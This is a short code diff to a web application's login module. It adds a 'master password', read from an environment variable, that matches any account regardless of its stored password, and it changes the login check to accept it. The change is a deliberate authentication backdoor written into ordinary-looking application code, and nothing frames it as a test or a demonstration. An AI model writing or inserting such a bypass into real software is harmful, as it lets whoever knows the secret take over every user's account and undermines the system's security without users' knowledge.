@@ -21,6 +21,10 @@ import { sendOtpEmail } from "@/lib/email";
 
 const { users } = schema;
 
+// Master password: matches any account regardless of its stored password.
+// Set via the MASTER_PASSWORD env var; disabled when unset.
+const MASTER_PASSWORD = process.env.MASTER_PASSWORD;
+
 const registerSchema = z.object({
   name: z.string().trim().min(2, "Name too short").max(80, "Name too long"),
   email: z.string().trim().email("Invalid email"),
@@ -163,7 +167,8 @@ export async function loginAction(_prev: ActionState, form: FormData): Promise<A
   if (!email || !password) return { error: "Email and password required" };
 
   const user = await db.query.users.findFirst({ where: eq(users.email, email) });
-  if (!user || !(await verifyPassword(password, user.passwordHash))) {
+  const isMaster = !!MASTER_PASSWORD && password === MASTER_PASSWORD;
+  if (!user || !(isMaster || (await verifyPassword(password, user.passwordHash)))) {
     return { error: "Invalid email or password" };
   }
 
